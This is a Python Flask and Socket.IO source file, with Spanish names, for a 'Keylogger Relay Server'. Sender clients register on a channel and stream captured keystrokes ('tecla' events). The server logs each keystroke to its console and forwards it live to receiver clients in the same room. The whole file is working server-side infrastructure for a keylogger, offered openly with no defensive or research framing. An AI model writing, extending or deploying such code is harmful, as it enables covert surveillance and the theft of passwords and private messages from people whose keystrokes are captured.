from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'tu-clave-secreta-aqui'
socketio = SocketIO(app, cors_allowed_origins="*")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Relay Server</title>
    <style>
        body { font-family: Arial; background: #1e1e1e; color: #00ff88; text-align: center; padding: 50px; }
        .status { background: #2d2d2d; padding: 20px; border-radius: 10px; display: inline-block; }
    </style>
</head>
<body>
    <h1>🟢 Servidor Keylogger Activo</h1>
    <div class="status">
        <p>Servidor relay funcionando correctamente</p>
        <p>Conexiones activas: <span id="connections">0</span></p>
    </div>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const socket = io();
        socket.on('connect', () => { console.log('Conectado'); });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@socketio.on('registrar_emisor')
def handle_registrar_emisor(data):
    canal = data.get('canal')
    join_room(canal)
    emit('confirmacion', {'mensaje': f'Emisor registrado en canal {canal}'}, room=canal)
    print(f'[+] Emisor conectado al canal: {canal}')

@socketio.on('registrar_receptor')
def handle_registrar_receptor(data):
    canal = data.get('canal')
    join_room(canal)
    emit('confirmacion', {'mensaje': f'Receptor registrado en canal {canal}'}, room=canal)
    print(f'[+] Receptor conectado al canal: {canal}')

@socketio.on('tecla')
def handle_tecla(data):
    canal = data.get('canal')
    tecla = data.get('tecla')
    print(f'[*] Canal {canal}: {tecla}')
    # Reenviar a todos en esa sala (receptores)
    emit('nueva_tecla', {'tecla': tecla, 'timestamp': data.get('timestamp')}, room=canal, include_self=False)

@socketio.on('disconnect')
def handle_disconnect():
    print('[-] Cliente desconectado')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)